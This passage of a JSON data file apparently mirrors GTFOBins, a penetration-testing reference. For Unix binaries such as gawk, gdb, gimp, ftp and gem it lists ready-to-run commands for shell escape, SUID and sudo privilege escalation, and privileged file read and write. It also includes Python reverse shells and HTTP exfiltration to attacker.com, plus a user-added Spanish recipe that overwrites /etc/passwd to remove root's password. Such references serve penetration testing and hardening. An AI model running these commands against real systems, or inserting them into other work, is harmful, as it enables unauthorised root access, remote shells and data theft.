                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "DATA is a format string, it supports some escape sequences.",
                        "code": "LFILE=file_to_write\nfind / -fprintf \"$FILE\" DATA -quit"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which find) .\n\n./find . -exec /bin/sh -p \\; -quit"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo find . -exec /bin/sh \\; -quit"
                    }
                ]
            }
        ]
    },
    {
        "name": "fmt",
        "url": "https://gtfobins.github.io/gtfobins/fmt/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The read file content is not binary-safe."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This only works for the GNU version of fmt.",
                        "code": "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\""
                    },
                    {
                        "description": "This corrupts the output by wrapping very long lines at the given width.",
                        "code": "LFILE=file_to_read\nfmt -999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This corrupts the output by wrapping very long lines at the given width.",
                        "code": "sudo install -m =xs $(which fmt) .\n\nLFILE=file_to_read\n./fmt -999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This corrupts the output by wrapping very long lines at the given width.",
                        "code": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "flock",
        "url": "https://gtfobins.github.io/gtfobins/flock/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "flock -u / /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which flock) .\n\n./flock -u / /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo flock -u / /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "fish",
        "url": "https://gtfobins.github.io/gtfobins/fish/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "fish"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which fish) .\n\n./fish"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo fish"
                    }
                ]
            }
        ]
    },
    {
        "name": "fold",
        "url": "https://gtfobins.github.io/gtfobins/fold/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nfold -w99999999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which fold) .\n\nLFILE=file_to_read\n./fold -w99999999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "fping",
        "url": "https://gtfobins.github.io/gtfobins/fping/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nfping -f $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo fping -f $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "ftp",
        "url": "https://gtfobins.github.io/gtfobins/ftp/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ftp\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file to a FTP server.",
                        "code": "RHOST=attacker.com\nftp $RHOST\nput file_to_send"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file from a FTP server.",
                        "code": "RHOST=attacker.com\nftp $RHOST\nget file_to_get"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ftp\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "gawk",
        "url": "https://gtfobins.github.io/gtfobins/gawk/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "gawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell.",
                        "code": "LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ngawk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which gawk) .\n\nLFILE=file_to_read\n./gawk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Sudo Alternativo - By SkyW4r33x",
                "description": "Por si el sudo oficial de GTFOBins no es efectivo, usa esta alternativa.",
                "examples": [
                    {
                        "description": "En la máquina víctima ubícate en el directorio /tmp/.",
                        "code": "cd /tmp/"
                    },
                    {
                        "description": "Copia el /etc/passwd en el directorio",
                        "code": "cp /etc/passwd ."
                    },
                    {
                        "description": "Modifica el passwd que copiaste y quita la 'x' del usuario root para que no pida contraseña al momento de autenticarte como root",
                        "code": "root::0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
                    },
                    {
                        "description": "Sobrescribe el archivo passwd original con la versión modificada usando la ruta absoluta del binario gawk",
                        "code": "/usr/bin/gawk 'BEGIN { \n    while ((getline < \"/tmp/passwd\") > 0) print > \"/etc/passwd\"; \n    while ((getline < \"/etc/passwd\") > 0) print > \"/etc/passwd\"; \n}'"
                    },
                    {
                        "description": "Finalmente, intenta autenticarte como root. Si todo salió bien, deberías obtener acceso sin que te pida contraseña:",
                        "code": "$ su root\nwhoami\n# root"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which gawk) .\n\n./gawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "gcc",
        "url": "https://gtfobins.github.io/gtfobins/gcc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "gcc -wrapper /bin/sh,-s ."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ngcc -x c -E \"$LFILE\""
                    },
                    {
                        "description": "The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.",
                        "code": "LFILE=file_to_read\ngcc @\"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo gcc -wrapper /bin/sh,-s ."
                    }
                ]
            }
        ]
    },
    {
        "name": "gcloud",
        "url": "https://gtfobins.github.io/gtfobins/gcloud/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "gcloud help\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo gcloud help\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "gcore",
        "url": "https://gtfobins.github.io/gtfobins/gcore/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named core.$PID, that is then often filtered with strings to narrow down relevant information."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "gcore $PID"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which gcore) .\n\n./gcore $PID"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo gcore $PID"
                    }
                ]
            }
        ]
    },
    {
        "name": "gdb",
        "url": "https://gtfobins.github.io/gtfobins/gdb/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "gdb -nx -ex '!sh' -ex quit"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit"
                    },
                    {
                        "description": "This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support.",
                        "code": "LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support.",
                        "code": "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support.",
                        "code": "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support.",
                        "code": "sudo install -m =xs $(which gdb) .\n\n./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo gdb -nx -ex '!sh' -ex quit"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "This requires that GDB is compiled with Python support.",
                        "code": "cp $(which gdb) .\nsudo setcap cap_setuid+ep gdb\n\n./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
                    }
                ]
            }
        ]
    },
    {
        "name": "genie",
        "url": "https://gtfobins.github.io/gtfobins/genie/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "genie -c '/bin/sh'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which genie) .\n\n./genie -c '/bin/sh'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo genie -c '/bin/sh'"
                    }
                ]
            }
        ]
    },
    {
        "name": "gem",
        "url": "https://gtfobins.github.io/gtfobins/gem/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This requires the name of an installed gem to be provided (rdoc is usually installed).",
                        "code": "gem open -e \"/bin/sh -c /bin/sh\" rdoc"
                    },
                    {
                        "description": "This invokes the default editor, which is likely to be vi, other functions may apply. This requires the name of an installed gem to be provided (rdoc is usually installed).",
                        "code": "gem open rdoc\n:!/bin/sh"
                    },
                    {
                        "description": "This executes the specified file as ruby code.",
                        "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x"
                    },
                    {
                        "description": "This executes the specified file as ruby code.",
                        "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This requires the name of an installed gem to be provided (rdoc is usually installed).",
                        "code": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
                    }
                ]
            }
        ]
    },
    {
        "name": "ghc",
        "url": "https://gtfobins.github.io/gtfobins/ghc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ghc -e 'System.Process.callCommand \"/bin/sh\"'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
                    }
                ]
            }
        ]
    },
    {
        "name": "genisoimage",
        "url": "https://gtfobins.github.io/gtfobins/genisoimage/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like 7z."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.",
                        "code": "sudo install -m =xs $(which genisoimage) .\n\nLFILE=file_to_read\n./genisoimage -sort \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "ghci",
        "url": "https://gtfobins.github.io/gtfobins/ghci/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ghci\nSystem.Process.callCommand \"/bin/sh\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\""
                    }
                ]
            }
        ]
    },
    {
        "name": "gimp",
        "url": "https://gtfobins.github.io/gtfobins/gimp/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The binary hangs after executing the Python code and can be terminated pressing ctrl-c."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'"
                    },
                    {
                        "description": "Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which gimp) .\n\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "ginsh",
        "url": "https://gtfobins.github.io/gtfobins/ginsh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ginsh\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ginsh\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ginsh) .\n\n./ginsh\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
